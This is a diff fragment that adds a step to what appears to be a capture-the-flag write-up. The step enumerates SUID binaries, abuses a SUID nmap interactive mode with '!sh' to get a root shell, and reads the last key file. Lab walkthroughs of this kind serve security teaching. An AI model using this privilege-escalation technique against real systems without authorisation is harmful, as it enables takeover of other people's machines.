@@ -91,4 +91,35 @@ cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
 ```
 
-
+```
+$ find / -perm -04000 2>/dev/null
+/bin/umount
+/bin/mount
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+$ /usr/local/bin/nmap
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+whoami
+root
+cd /root
+ls
+firstboot_done
+key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
